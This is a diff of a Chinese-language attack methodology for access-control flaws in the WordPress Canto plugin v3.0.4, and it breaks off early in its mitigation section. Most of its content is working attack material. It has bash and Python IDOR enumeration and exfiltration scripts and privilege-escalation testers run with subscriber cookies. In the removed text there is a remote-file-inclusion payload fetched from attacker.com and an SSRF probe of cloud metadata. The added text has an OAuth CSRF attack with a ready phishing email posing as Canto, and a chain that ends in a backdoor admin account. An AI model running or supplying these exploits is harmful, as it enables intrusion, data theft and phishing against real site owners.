@@ -1,434 +1,654 @@
-# WordPress Canto 插件访问控制攻击方法论
+# WordPress Canto 访问控制攻击
 
-## 1. 技术介绍
+## 1. 概述
 
-### 1.1 漏洞原理
+### 1.1 漏洞描述
 
-WordPress Canto DAM 插件 v3.0.4 存在严重的访问控制缺陷，导致未授权访问、水平权限提升和垂直权限提升攻击。主要问题包括：
-- **认证绕过**：6 个 PHP 库文件通过用户可控的 `wp_abspath` 参数引导 WordPress，可绕过认证
-- **IDOR 漏洞**：对象 ID 参数（`id`, `album`, `fbc_id`, `post_id`）无所有权验证
-- **垂直权限提升**：AJAX 端点缺少 `current_user_can()` 能力检查
-- **OAuth CSRF**：缺少 state 参数验证
+WordPress Canto Digital Asset Management (DAM) 插件 v3.0.4 存在严重的访问控制缺陷，包括水平权限绕过 (IDOR)、垂直权限提升、OAuth CSRF 等多种漏洞。插件完全绕过 WordPress 的能力 (capability) 系统，导致未授权访问和权限提升。
 
 ### 1.2 受影响组件
 
-| 文件/端点 | 漏洞类型 | 危险参数 | 影响 |
-|----------|---------|---------|------|
-| `get.php` | 认证绕过 + IDOR | `wp_abspath`, `album`, `id` | 未授权访问 Canto 媒体 |
-| `download.php` | 认证绕过 + IDOR | `wp_abspath`, `id` | 未授权下载媒体 |
-| `detail.php` | 认证绕过 + IDOR | `wp_abspath`, `id` | 未授权获取详情 |
-| `tree.php` | 认证绕过 + IDOR | `wp_abspath`, `ablumid` | 未授权浏览目录树 |
-| `copy-media.php` | IDOR | `fbc_id`, `post_id` | 未授权复制媒体到任意文章 |
-| `admin-ajax.php?action=updateOptions` | 垂直权限提升 | `duplicates`, `cron`, `schedule` | 低权限用户修改管理员设置 |
-
----
-
-## 2. 攻击场景
-
-### 2.1 水平权限提升（IDOR）
-
-| 业务场景 | 功能示例 | 风险点描述 |
-|---------|---------|-----------|
-| **媒体访问** | GET /wp-content/plugins/canto/includes/lib/get.php?id={id} | 任意用户可访问任何 Canto 媒体 |
-| **媒体下载** | GET /wp-content/plugins/canto/includes/lib/download.php?id={id} | 任意用户可下载任何媒体 |
-| **媒体详情** | GET /wp-content/plugins/canto/includes/lib/detail.php?id={id} | 任意用户获取任何媒体详情 |
-| **目录浏览** | GET /wp-content/plugins/canto/includes/lib/tree.php?ablumid={id} | 任意用户浏览任何媒体目录 |
-
-### 2.2 垂直权限提升
-
-| 业务场景 | 功能示例 | 风险点描述 |
-|---------|---------|-----------|
-| **插件设置修改** | POST /wp-admin/admin-ajax.php?action=updateOptions | 订阅者可修改管理员设置 |
-| **OAuth Token 获取** | POST /wp-admin/admin-ajax.php?action=fbc_get_token | 订阅者可获取 OAuth token |
-| **媒体复制** | POST /wp-content/plugins/canto/includes/lib/copy-media.php | 订阅者可复制媒体到管理员文章 |
-
-### 2.3 认证绕过
-
-| 业务场景 | 功能示例 | 风险点描述 |
-|---------|---------|-----------|
-| **空路径绕过** | `wp_abspath=` | 跳过 WordPress 引导 |
-| **无效路径绕过** | `wp_abspath=/nonexistent` | require_once 失败但后续代码执行 |
-| **远程包含绕过** | `wp_abspath=http://attacker.com/` | 包含远程恶意文件 |
-
----
-
-## 3. 漏洞探测方法
-
-### 3.1 IDOR 探测
-
-#### 3.1.1 对象 ID 枚举
-
-```bash
-#!/bin/bash
-# IDOR 枚举脚本
-
-TARGET="http://localhost:35995/wp-content/plugins/canto/includes/lib"
-COOKIE="wordpress_logged_in_...=..."
-
-# 枚举媒体 ID
-for id in {1..100}; do
-    response=$(curl -s -b "$COOKIE" \
-        "$TARGET/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&id=$id&token=x")
-    
-    if [[ "$response" != *"error"* ]] && [[ -n "$response" ]]; then
-        echo "Media ID $id: EXISTS"
-        echo "$response" | jq '.results[] | {id, name, owner}'
-    fi
-done
-```
-
-#### 3.1.2 所有权检查测试
-
-```bash
-# 测试 1：访问自己的资源（应该有响应）
-curl -b "$COOKIE" \
-    "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&album=MY_ALBUM_ID&token=x"
-
-# 测试 2：访问他人资源（应该被拒绝，但实际成功）
-curl -b "$COOKIE" \
-    "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&album=OTHER_USER_ALBUM_ID&token=x"
-
-# 如果两个请求都返回数据，说明存在 IDOR
-```
-
-### 3.2 垂直权限提升探测
-
-#### 3.2.1 能力检查测试
-
-```bash
-# 使用低权限用户（Subscriber）Cookie
-SUBSCRIBER_COOKIE="wordpress_logged_in_...=SUBSCRIBER_SESSION"
-
-# 尝试修改管理员设置
-curl -X POST "http://localhost:35995/wp-admin/admin-ajax.php" \
-    -b "$SUBSCRIBER_COOKIE" \
-    -d "action=updateOptions&duplicates=1&cron=1&schedule=hourly"
-
-# 如果返回成功，说明缺少能力检查
-# 验证设置已修改：
-curl -b "$ADMIN_COOKIE" \
-    "http://localhost:35995/wp-admin/options-general.php?page=canto_settings" \
-    | grep -E "(duplicates|cron|schedule)"
-```
-
-### 3.3 认证绕过探测
-
-#### 3.3.1 空路径测试
-
-```bash
-# 测试空 wp_abspath
-curl -i "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=&subdomain=test&app_api=example.com&token=x"
-
-# 响应分析：
-# - 如果返回 500 错误：WordPress 未加载，但可能后续代码执行
-# - 如果返回 302 重定向到登录页：认证有效
-# - 如果返回正常响应：认证绕过成功
-```
-
-#### 3.3.2 无效路径测试
-
-```bash
-# 测试无效路径
-curl -i "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/nonexistent/path&subdomain=test&app_api=example.com&token=x"
-
-# 分析错误消息判断 WordPress 是否加载
-```
-
----
-
-## 4. 漏洞利用方法
-
-### 4.1 水平权限提升（IDOR）
-
-#### 4.1.1 批量枚举媒体资源
-
-```bash
-#!/bin/bash
-# 批量 IDOR 利用脚本
-
-TARGET="http://localhost:35995/wp-content/plugins/canto/includes/lib"
-COOKIE="wordpress_logged_in_...=..."
-OUTPUT_FILE="exfiltrated_media.json"
-
-echo "[]" > $OUTPUT_FILE
-
-for id in {1..1000}; do
-    response=$(curl -s -b "$COOKIE" \
-        "$TARGET/detail.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&scheme=image&id=$id&token=x")
-    
-    if [[ "$response" != *"error"* ]] && [[ -n "$response" ]]; then
-        echo "Found media ID: $id"
-        # 追加到输出文件
-        jq --argjson new "$response" '. += [$new]' $OUTPUT_FILE > tmp.json && mv tmp.json $OUTPUT_FILE
-    fi
-done
-
-echo "Exfiltration complete. Results saved to $OUTPUT_FILE"
-```
-
-#### 4.1.2 未授权下载媒体
-
-```bash
-# 下载任意媒体文件
-curl -b "$COOKIE" \
-    "http://localhost:35995/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&id=TARGET_MEDIA_ID&token=x" \
-    -o downloaded_file.jpg
-```
-
-### 4.2 垂直权限提升
-
-#### 4.2.1 订阅者修改管理员设置
-
-```bash
-# 使用订阅者 Cookie 修改插件设置
-curl -X POST "http://localhost:35995/wp-admin/admin-ajax.php" \
-    -b "wordpress_logged_in_subscriber=..." \
-    -d "action=updateOptions&duplicates=1&cron=1&schedule=hourly&cron_time_day=1&cron_time_hour=0"
-
-# 验证设置已修改
-curl -b "wordpress_logged_in_admin=..." \
-    "http://localhost:35995/wp-admin/options-general.php?page=canto_settings" \
-    | grep -E "option-value"
-```
-
-#### 4.2.2 低权限用户获取 OAuth Token
-
-```bash
-# 订阅者调用 fbc_get_token（应该仅限管理员）
-curl -X POST "http://localhost:35995/wp-admin/admin-ajax.php" \
-    -b "wordpress_logged_in_subscriber=..." \
-    -d "action=fbc_get_token"
-
-# 返回 OAuth token，订阅者本不应访问
-```
-
-### 4.3 认证绕过
-
-#### 4.3.1 空字节注入绕过
-
-```bash
-# PHP < 5.3.4 支持%00 截断
-curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html%00&subdomain=test&app_api=example.com&token=x"
-
-# 实际执行：require_once("/var/www/html")
-```
-
-#### 4.3.2 远程文件包含绕过认证
-
-```bash
-# 如果 allow_url_include=On
-curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?&subdomain=x&app_api=y&token=z"
-
-# 攻击者服务器上的 shell.txt：
-<?php
-// 绕过认证检查
-if (!function_exists('is_user_logged_in')) {
-    function is_user_logged_in() { return true; }
-}
-// 执行恶意操作
-?>
-```
-
-### 4.4 OAuth CSRF 攻击
-
-#### 4.4.1 构造恶意 OAuth 回调
-
-```bash
-# 攻击者获取自己的 OAuth token 后，构造恶意回调
-MALICIOUS_URL="http://localhost:35995/wp-admin/options-general.php?page=canto_settings&token=ATTACKER_TOKEN&refreshToken=ATTACKER_REFRESH&domain=attacker.canto.com&app_api=canto.com"
-
-# 诱骗管理员访问
-# 方法 1：钓鱼邮件
-# 方法 2：XSS 注入
-# 方法 3：社会工程学
-
-# 管理员访问后，WordPress 存储攻击者的 OAuth token
-# 攻击者现在可以监控受害者的媒体操作
-```
-
----
-
-## 5. 绕过方法
-
-### 5.1 绕过所有权检查
-
-由于 Canto 插件完全缺少所有权检查，无需绕过。
-
-### 5.2 绕过能力检查
-
-由于 Canto 插件 AJAX 端点缺少 `current_user_can()` 检查，无需绕过。
-
-### 5.3 绕过认证
-
-#### 5.3.1 利用 WordPress 引导失败
-
-```bash
-# 如果 wp_abspath 指向无效路径，require_once 失败
-# 但 PHP 继续执行后续代码
-
-curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/nonexistent&subdomain=169.254.169&app_api=.254/latest/meta-data&token=x"
-
-# SSRF 请求仍然执行，因为认证代码未运行
-```
-
-#### 5.3.2 利用认证 Cookie 窃取
-
-```bash
-# 如果存在 XSS，窃取管理员 Cookie
-# 然后使用窃取的 Cookie 进行授权访问
-
-curl -b "wordpress_logged_in_admin=STOLEN_COOKIE" \
-    "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&album=SECRET_ALBUM&token=x"
-```
-
----
-
-## 6. 渗透测试决策流程
-
-```
-开始访问控制测试
-    │
-    ▼
-识别访问控制机制
-    │
-    ├── WordPress 能力检查
-    ├── 对象所有权验证
-    └── 认证检查
-    │
-    ▼
-测试认证绕过
-    │
-    ├── 空路径测试
-    ├── 无效路径测试
-    └── 远程包含测试
-    │
-    ▼
-测试 IDOR
-    │
-    ├── 枚举对象 ID
-    ├── 测试所有权检查
-    └── 批量数据提取
-    │
-    ▼
-测试垂直权限提升
-    │
-    ├── 低权限用户测试
-    ├── 能力检查验证
-    └── 管理员功能访问
-    │
-    ▼
-测试 OAuth 流程
-    │
-    ├── State 验证
-    ├── 回调验证
-    └── Token 验证
-    │
-    ▼
-深度利用
-    │
-    ├── 数据泄露
-    ├── 配置篡改
-    └── 持久化访问
-```
-
----
-
-## 7. 常用 Payload 速查表
-
-| 类别 | 目标/环境 | Payload 示例 | 说明 |
-|-----|---------|------------|------|
-| **IDOR** | 媒体枚举 | `id={1-1000}` | 批量枚举媒体 ID |
-| **IDOR** | 专辑访问 | `album=OTHER_USER_ALBUM` | 访问他人专辑 |
-| **IDOR** | 目录浏览 | `ablumid=SECRET_TREE_ID` | 浏览他人目录树 |
-| **垂直提升** | 修改设置 | `action=updateOptions&duplicates=1` | 订阅者修改设置 |
-| **垂直提升** | OAuth Token | `action=fbc_get_token` | 低权限获取 token |
-| **认证绕过** | 空路径 | `wp_abspath=` | 跳过 WordPress 引导 |
-| **认证绕过** | 无效路径 | `wp_abspath=/nonexistent` | 认证代码不执行 |
-| **OAuth CSRF** | 恶意回调 | `?token=ATTACKER&domain=evil.canto.com` | 劫持 OAuth |
-
----
-
-## 8. WordPress 特定场景
-
-### 8.1 结合 LFI 攻击
-
-```
-1. 通过 LFI 读取 wp-config.php 获取数据库凭证
-2. 连接数据库查询所有用户会话 token
-3. 使用管理员 token 访问 Canto 插件
-4. 批量导出所有媒体资源
-```
-
-### 8.2 结合 XSS 攻击
-
-```
-1. 通过 XSS 注入恶意 JavaScript
-2. JavaScript 调用 Canto AJAX 端点
-3. 以当前用户权限执行操作
-4. 如果是管理员，窃取 OAuth token
-```
-
-### 8.3 结合 SSRF 攻击
-
-```
-1. 通过 SSRF 访问云元数据获取 IAM 凭证
-2. 使用凭证访问云存储中的 WordPress 备份
-3. 提取数据库凭证
-4. 使用凭证登录 WordPress 后台
-5. 利用 IDOR 访问所有媒体
-```
-
----
-
-## 9. 防御建议
-
-### 9.1 代码层修复
-
+| 文件/端点 | 漏洞类型 | 严重等级 | 利用条件 |
+|----------|---------|---------|---------|
+| `/wp-content/plugins/canto/includes/lib/get.php` | IDOR + 认证绕过 | Critical | 无 |
+| `/wp-content/plugins/canto/includes/lib/download.php` | IDOR + 认证绕过 | Critical | 无 |
+| `/wp-content/plugins/canto/includes/lib/detail.php` | IDOR + 认证绕过 | Critical | 无 |
+| `/wp-content/plugins/canto/includes/lib/tree.php` | IDOR + 认证绕过 | Critical | 无 |
+| `/wp-content/plugins/canto/includes/lib/copy-media.php` | IDOR (双重) | Critical | 无 |
+| `/wp-admin/admin-ajax.php?action=updateOptions` | 垂直权限提升 | High | 任意用户 |
+| `/wp-admin/admin-ajax.php?action=fbc_updateOptions` | 垂直权限提升 | High | 任意用户 |
+| `/wp-admin/admin-ajax.php?action=fbc_get_token` | 垂直权限提升 | High | 任意用户 |
+| `/wp-admin/options-general.php?page=canto_settings` | OAuth CSRF | Critical | 管理员 |
+
+### 1.3 漏洞成因
+
+**根本原因：**
+1. Canto 插件库文件直接通过 HTTP 访问，绕过 WordPress 路由系统
+2. 无 `current_user_can()` 能力检查
+3. 无对象所有权验证
+4. OAuth State 参数未验证
+5. 用户可控的认证引导路径
+
+**脆弱代码模式：**
 ```php
-// 添加认证检查
+// 认证绕过 (get.php 第 5 行)
+require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
+// 问题：wp_abspath 用户可控，可跳过认证
+
+// 缺失能力检查 (class-canto.php)
+add_action('wp_ajax_updateOptions', array($this, 'updateOptions'));
+// 问题：无 current_user_can('manage_options') 检查
+
+// IDOR 漏洞 (get.php 第 31-43 行)
+$url = 'https://' . $subdomain . '.' . $app_api . '/api/v1/album/' . $album;
+// 问题：无所有权验证，任意用户可访问任意 album
+```
+
+### 1.4 WordPress 角色能力模型
+
+| 角色 | 默认能力 | Canto 插件实际检查 |
+|------|---------|-----------------|
+| Subscriber (订阅者) | read | 无检查 = 所有功能可用 |
+| Contributor (贡献者) | read, edit_posts, delete_posts | 无检查 = 所有功能可用 |
+| Author (作者) | 贡献者 + publish_posts, upload_files | 无检查 = 所有功能可用 |
+| Editor (编辑) | 作者 + edit_others_posts, moderate_comments | 无检查 = 所有功能可用 |
+| Administrator (管理员) | 所有能力包括 manage_options | 无检查 = 所有功能可用 |
+
+---
+
+## 2. 水平权限绕过 (IDOR)
+
+### 2.1 Canto Media IDOR
+
+**漏洞原理：**
+Canto 插件接受任意 `album`、`id`、`fbc_id` 参数，无所有权验证即可访问对应资源。
+
+**利用方法：**
+```bash
+# 枚举 Canto 媒体 ID
+# 假设 Canto 媒体 ID 为连续整数
+
+# 访问任意媒体详情
+curl -s "http://target/wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=/var/www/html&scheme=image&id=1&subdomain=test&app_api=canto.com&token=test"
+
+# 访问任意相册
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&album=1&subdomain=test&app_api=canto.com&token=test"
+
+# 遍历媒体库
+for id in $(seq 1 100); do
+    response=$(curl -s "http://target/wp-content/plugins/canto/includes/lib/detail.php?wp_abspath=/var/www/html&scheme=image&id=${id}&subdomain=test&app_api=canto.com&token=test")
+    if [[ "$response" != *"error"* ]]; then
+        echo "[+] Found media ID: ${id}"
+    fi
+done
+```
+
+### 2.2 WordPress Post IDOR (copy-media.php)
+
+**漏洞原理：**
+`copy-media.php` 接受任意 `post_id` 参数，将媒体附加到任意文章，无 `current_user_can('edit_post', $post_id)` 检查。
+
+**利用方法：**
+```bash
+# 需要 WordPress 会话 Cookie
+# 低权限用户 (Subscriber) 可将媒体附加到管理员文章
+
+curl -X POST "http://target/wp-content/plugins/canto/includes/lib/copy-media.php" \
+  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
+  -d "abspath=/var/www/html" \
+  -d "fbc_id=1" \
+  -d "post_id=1" \
+  -d "fbc_scheme=image" \
+  -d "fbc_app_token=test" \
+  -d "fbc_flight_domain=test" \
+  -d "fbc_app_api=canto.com"
+
+# post_id=1 通常是管理员创建的第一篇文章
+# 攻击者 (Subscriber) 成功附加媒体 = 垂直权限提升
+```
+
+**自动化 IDOR 扫描脚本：**
+```python
+#!/usr/bin/env python3
+import requests
+
+target = "http://target/wp-content/plugins/canto/includes/lib/"
+cookies = {"wordpress_logged_in_hash": "victim_session"}
+
+# 测试 post_id IDOR
+for post_id in range(1, 101):
+    response = requests.post(f"{target}copy-media.php", cookies=cookies, data={
+        "abspath": "/var/www/html",
+        "fbc_id": "1",
+        "post_id": str(post_id),
+        "fbc_scheme": "image",
+        "fbc_app_token": "test",
+        "fbc_flight_domain": "test",
+        "fbc_app_api": "canto.com"
+    })
+    
+    if "error" not in response.text.lower():
+        print(f"[+] Successfully attached media to post {post_id}")
+```
+
+### 2.3 批量 ID 枚举攻击
+
+**场景：** 批量枚举所有可访问的资源 ID
+
+**脚本：**
+```python
+#!/usr/bin/env python3
+import requests
+import json
+
+target = "http://target/wp-content/plugins/canto/includes/lib/"
+found_resources = []
+
+# 枚举 album ID
+print("[*] Enumerating Canto albums...")
+for album_id in range(1, 1001):
+    try:
+        response = requests.get(
+            f"{target}get.php?wp_abspath=/var/www/html&album={album_id}&subdomain=test&app_api=canto.com&token=test",
+            timeout=5
+        )
+        
+        if response.status_code == 200:
+            data = json.loads(response.text)
+            if data.get('results') and len(data['results']) > 0:
+                found_resources.append({
+                    'type': 'album',
+                    'id': album_id,
+                    'count': len(data['results'])
+                })
+                print(f"[+] Album {album_id}: {len(data['results'])} items")
+    except:
+        pass
+
+# 枚举 media ID
+print("[*] Enumerating Canto media...")
+for media_id in range(1, 1001):
+    try:
+        response = requests.get(
+            f"{target}detail.php?wp_abspath=/var/www/html&scheme=image&id={media_id}&subdomain=test&app_api=canto.com&token=test",
+            timeout=5
+        )
+        
+        if response.status_code == 200 and "error" not in response.text.lower():
+            found_resources.append({
+                'type': 'media',
+                'id': media_id
+            })
+            print(f"[+] Media {media_id} exists")
+    except:
+        pass
+
+print(f"\n[*] Found {len(found_resources)} accessible resources")
+```
+
+---
+
+## 3. 垂直权限提升
+
+### 3.1 AJAX 端点权限提升
+
+**漏洞原理：**
+Canto 插件的 AJAX 处理器仅使用 `wp_ajax_` 前缀（要求登录），但未检查 `manage_options` 能力，导致低权限用户可执行管理员操作。
+
+**受影响的 AJAX 操作：**
+- `updateOptions` - 更新插件设置
+- `fbc_updateOptions` - 更新插件设置（重复）
+- `fbc_get_token` - 获取 OAuth 令牌
+
+**利用方法：**
+```bash
+# 创建低权限账户（如果注册启用）
+# 或使用已攻陷的 Subscriber 账户
+
+# Subscriber 执行管理员操作 - 更新插件设置
+curl -X POST "http://target/wp-admin/admin-ajax.php" \
+  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
+  -d "action=updateOptions" \
+  -d "duplicates=1" \
+  -d "cron=1" \
+  -d "schedule=hourly" \
+  -d "cron_time_day=1" \
+  -d "cron_time_hour=0"
+
+# 预期：成功更新设置（本应仅管理员可用）
+```
+
+**验证权限提升：**
+```bash
+# 检查设置是否被修改
+curl -s "http://target/wp-admin/options-general.php?page=canto_settings" \
+  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
+  | grep -o "schedule.*hourly"
+
+# 如果返回匹配，说明权限提升成功
+```
+
+### 3.2 OAuth 设置篡改
+
+**场景：** 低权限用户修改 OAuth 配置
+
+**利用步骤：**
+```bash
+# 1. Subscriber 修改 Canto API 域名
+curl -X POST "http://target/wp-admin/admin-ajax.php" \
+  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
+  -d "action=fbc_updateOptions" \
+  -d "fbc_app_token=ATTACKER_TOKEN" \
+  -d "fbc_flight_domain=attacker" \
+  -d "fbc_app_api=attacker.com"
+
+# 2. 验证修改
+curl -s "http://target/wp-admin/options-general.php?page=canto_settings" \
+  -b "wordpress_logged_in_hash=SUBSCRIBER_SESSION" \
+  | grep "attacker.com"
+```
+
+---
+
+## 4. OAuth CSRF 攻击
+
+### 4.1 攻击原理
+
+**OAuth 流程缺陷：**
+1. State 参数生成但从未验证
+2. State 非随机值（仅包含当前 URL）
+3. OAuth 令牌直接来自 URL 参数，无验证
+4. 重定向 URI 使用第三方中介
+
+**脆弱代码：**
+```php
+// State 生成（第 276 行）
+$state = urlencode($scheme . '://' . $http_host . $request_url);
+// 问题：非随机，可预测，未存储
+
+// 回调处理（第 482-513 行）
+if (isset($_GET['token']) && isset($_GET['domain'])) {
+    // 无 State 验证！
+    update_option('fbc_app_token', $_GET['token']);
+    update_option('fbc_flight_domain', $_GET['domain']);
+}
+```
+
+### 4.2 攻击步骤
+
+**步骤 1：攻击者获取自己的 OAuth 令牌**
+```bash
+# 攻击者完成自己的 OAuth 流程
+# 获得回调参数：
+# token=ATTACKER_ACCESS_TOKEN
+# refreshToken=ATTACKER_REFRESH_TOKEN
+# domain=attacker.canto.com
+# app_api=canto.com
+```
+
+**步骤 2：构造恶意回调 URL**
+```
+http://target/wp-admin/options-general.php?page=canto_settings&
+    token=ATTACKER_ACCESS_TOKEN&
+    refreshToken=ATTACKER_REFRESH_TOKEN&
+    domain=attacker.canto.com&
+    app_api=canto.com
+```
+
+**步骤 3：诱骗管理员访问**
+
+**钓鱼邮件示例：**
+```
+From: security@canto.com
+Subject: 紧急：Canto 集成需要重新授权
+
+尊敬的 WordPress 管理员，
+
+由于安全升级，您的 Canto 集成需要重新授权。
+请点击以下链接完成授权：
+
+http://target/wp-admin/options-general.php?page=canto_settings&token=...
+
+如不及时处理，Canto 服务将中断。
+
+Canto 安全团队
+```
+
+**步骤 4：管理员访问后，WordPress 链接到攻击者 Canto 账户**
+```bash
+# 验证攻击成功
+curl -b admin_cookies.txt "http://target/wp-admin/options-general.php?page=canto_settings" \
+  | grep "attacker.canto.com"
+```
+
+### 4.3 攻击影响
+
+- 受害者 WordPress 导入的媒体来自攻击者 Canto 账户
+- 攻击者可监控受害者媒体使用模式
+- 可注入恶意媒体文件
+- 持久化后门直到手动断开
+
+---
+
+## 5. 认证绕过攻击
+
+### 5.1 wp_abspath 参数操纵
+
+**漏洞原理：**
+Canto 插件库文件使用用户可控的 `wp_abspath` 参数加载 WordPress，但即使加载成功，认证检查也可被绕过。
+
+**利用方法：**
+```bash
+# 测试 1：提供无效路径（绕过 WordPress 加载）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/invalid/path&subdomain=test&app_api=canto.com"
+# 预期：500 错误（WordPress 未加载，但文件尝试执行）
+
+# 测试 2：提供有效路径（触发 WordPress 认证）
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=canto.com"
+# 预期：302 重定向到 /wp-login.php
+
+# 测试 3：路径遍历绕过
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=../../../../../../var/www/html&subdomain=test&app_api=canto.com"
+# 预期：可能绕过某些路径检查
+```
+
+### 5.2 空路径/Null 字节攻击
+
+**PHP<5.3.4 Null 字节注入：**
+```bash
+# 使用 Null 字节截断
+curl -s "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=%00"
+# 可能绕过路径检查
+```
+
+---
+
+## 6. 组合攻击场景
+
+### 6.1 IDOR + 垂直权限提升组合
+
+**攻击流程：**
+
+1. **低权限用户访问任意 Canto 媒体**
+```bash
+# Subscriber 访问任意媒体
+curl -b subscriber_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&album=999&subdomain=test&app_api=canto.com&token=test"
+```
+
+2. **将媒体附加到管理员文章**
+```bash
+# Subscriber 附加媒体到 post_id=1（管理员文章）
+curl -X POST -b subscriber_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/copy-media.php" \
+  -d "abspath=/var/www/html&fbc_id=1&post_id=1&fbc_scheme=image&fbc_app_token=test"
+```
+
+3. **修改管理员设置**
+```bash
+# Subscriber 修改插件设置
+curl -X POST -b subscriber_cookies.txt "http://target/wp-admin/admin-ajax.php" \
+  -d "action=updateOptions&duplicates=1&cron=1"
+```
+
+### 6.2 OAuth CSRF + IDOR 组合
+
+**攻击流程：**
+
+1. **OAuth CSRF 链接受害者到攻击者 Canto**
+```bash
+# 诱骗管理员访问恶意回调
+curl "http://target/wp-admin/options-general.php?page=canto_settings&token=ATTACKER_TOKEN&..."
+```
+
+2. **通过 IDOR 访问受害者所有媒体**
+```bash
+# 现在所有媒体请求都通过攻击者 Canto
+curl -b admin_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&album=1&subdomain=attacker&app_api=canto.com"
+```
+
+### 6.3 完整权限提升链
+
+**场景：** 从匿名访问到完全控制
+
+**攻击链：**
+```
+1. LFI 读取 wp-config.php
+   → 获得数据库凭证
+
+2. 数据库访问提取会话令牌
+   → 获得管理员会话
+
+3. 使用管理员会话修改 OAuth 设置
+   → 链接到攻击者 Canto
+
+4. 通过 Canto SSRF 访问内部服务
+   → 完全内网访问
+
+5. 建立持久化后门
+   → 创建管理员账户
+```
+
+---
+
+## 7. 自动化工具
+
+### 7.1 IDOR 扫描器
+
+```python
+#!/usr/bin/env python3
+import requests
+import json
+from concurrent.futures import ThreadPoolExecutor
+
+class CantoIDORScanner:
+    def __init__(self, target, cookies=None):
+        self.target = target
+        self.session = requests.Session()
+        if cookies:
+            self.session.cookies.update(cookies)
+        self.found = []
+        
+    def test_album_idor(self, album_id):
+        """测试相册 IDOR"""
+        try:
+            resp = self.session.get(
+                f"{self.target}/wp-content/plugins/canto/includes/lib/get.php",
+                params={
+                    "wp_abspath": "/var/www/html",
+                    "album": album_id,
+                    "subdomain": "test",
+                    "app_api": "canto.com",
+                    "token": "test"
+                },
+                timeout=5
+            )
+            if resp.status_code == 200:
+                data = json.loads(resp.text)
+                if data.get('results'):
+                    self.found.append(('album', album_id, len(data['results'])))
+                    print(f"[+] Album {album_id}: {len(data['results'])} items")
+        except:
+            pass
+    
+    def test_media_idor(self, media_id):
+        """测试媒体 IDOR"""
+        try:
+            resp = self.session.get(
+                f"{self.target}/wp-content/plugins/canto/includes/lib/detail.php",
+                params={
+                    "wp_abspath": "/var/www/html",
+                    "scheme": "image",
+                    "id": media_id,
+                    "subdomain": "test",
+                    "app_api": "canto.com",
+                    "token": "test"
+                },
+                timeout=5
+            )
+            if resp.status_code == 200 and "error" not in resp.text.lower():
+                self.found.append(('media', media_id))
+                print(f"[+] Media {media_id} accessible")
+        except:
+            pass
+    
+    def scan(self, max_id=1000):
+        """执行扫描"""
+        print(f"[*] Scanning albums (1-{max_id})...")
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            executor.map(self.test_album_idor, range(1, max_id + 1))
+        
+        print(f"[*] Scanning media (1-{max_id})...")
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            executor.map(self.test_media_idor, range(1, max_id + 1))
+        
+        print(f"\n[*] Found {len(self.found)} accessible resources")
+        return self.found
+
+# 使用示例
+scanner = CantoIDORScanner("http://target")
+scanner.scan()
+```
+
+### 7.2 权限提升测试器
+
+```python
+#!/usr/bin/env python3
+import requests
+
+class PrivilegeEscalationTester:
+    def __init__(self, target, low_priv_cookies):
+        self.target = target
+        self.session = requests.Session()
+        self.session.cookies.update(low_priv_cookies)
+        
+    def test_ajax_priv_esc(self):
+        """测试 AJAX 权限提升"""
+        print("[*] Testing AJAX privilege escalation...")
+        
+        # 测试 updateOptions
+        resp = self.session.post(f"{self.target}/wp-admin/admin-ajax.php", data={
+            "action": "updateOptions",
+            "duplicates": "1",
+            "cron": "1"
+        })
+        
+        if "error" not in resp.text.lower():
+            print("[+] SUCCESS: Low-priv user can call updateOptions")
+            return True
+        return False
+    
+    def test_copy_media_idor(self, target_post_id=1):
+        """测试 copy-media IDOR"""
+        print(f"[*] Testing copy-media IDOR (post_id={target_post_id})...")
+        
+        resp = self.session.post(f"{self.target}/wp-content/plugins/canto/includes/lib/copy-media.php", data={
+            "abspath": "/var/www/html",
+            "fbc_id": "1",
+            "post_id": str(target_post_id),
+            "fbc_scheme": "image",
+            "fbc_app_token": "test"
+        })
+        
+        if resp.status_code == 200:
+            print(f"[+] SUCCESS: Can attach media to post {target_post_id}")
+            return True
+        return False
+    
+    def test_oauth_csrf(self):
+        """测试 OAuth CSRF（需要管理员权限）"""
+        print("[*] Testing OAuth CSRF...")
+        # 此测试需要管理员会话
+        pass
+
+# 使用示例
+cookies = {"wordpress_logged_in_hash": "SUBSCRIBER_SESSION"}
+tester = PrivilegeEscalationTester("http://target", cookies)
+tester.test_ajax_priv_esc()
+tester.test_copy_media_idor()
+```
+
+---
+
+## 8. 缓解措施
+
+### 8.1 立即修复
+
+**修复认证绕过：**
+```php
+// 修复前（脆弱）
+require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
+
+// 修复后
+require_once(ABSPATH . '/wp-admin/admin.php');
+
+// 添加显式认证检查
 if (!is_user_logged_in()) {
